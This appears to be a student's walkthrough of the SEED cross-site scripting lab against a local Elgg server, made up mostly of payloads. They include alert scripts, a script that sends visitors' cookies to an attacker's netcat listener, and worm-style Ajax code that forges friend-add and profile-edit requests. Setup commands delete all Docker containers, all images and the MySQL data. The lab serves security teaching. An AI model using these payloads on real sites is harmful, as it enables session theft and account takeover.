# SETUP
edit hosts
```bash
sudo gedit /etc/hosts &>/dev/null &
```

to remove previous containers
```bash
docker rm -vf $(docker ps -a -q)
```

to remove all images
```bash
docker rmi -f $(docker images -a -q)
```



```bash
dcbuild
dcup
```
open a new tab of cmd
```bash
dockps
```

to clear database
```bash
sudo rm -rf mysql_data
```

## Open a new tab of cmd
```bash
docksh 36b1
```



## Task 1

http://www.seed-server.com/
<br> Go to the seed server, log in to samy, edit profile, then save 

```js
<script>alert("XSS");</script>
```

## Task 2
same as task 1

```javascript
<script>alert(document.cookie);</script>
```

## Task 3

open a new tab of cmd
<br>start listenning to a port
```bash
nc -lknv 5555
```

in samy profile

```javascript
<script>document.write('<img src=http://10.9.0.1:5555?c='+escape(document.cookie) + '>');</script>
```
now log in to alice and samy profile


## Task 4

### Samy guid : 59

The code should be placed in the "About Me" field of Samy’s profile page

```javascript
<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

//Construct the HTTP request to add Samy as a friend.
var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + token + ts; //FILL IN
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET", sendurl, true);
Ajax.send();
}
</script>
```
paste the code in addfriend.js file

```bash
touch addfriend.js
sudo gedit addfriend.js &>/dev/null &
```

log out samy. log in to alice. see samy profile. then check friend of alice.


## Task 5
copy and paste code

```bash
touch editProfile.js
sudo gedit editProfile.js &>/dev/null &
```

```javascript
<script type="text/javascript">
window.onload = function(){
//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
//and Security Token __elgg_token
var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var desc = "&description=samy is my hero.&accesslevel[description]=2"
//Construct the content of your url.
var content=token + ts + userName + desc + guid;
//FILL IN
var samyGuid=59; //FILL IN
var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
if(elgg.session.user.guid!=samyGuid)
{
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
Ajax.setRequestHeader("Content-Type",
"application/x-www-form-urlencoded");
Ajax.send(content);
}
}
</script>
```








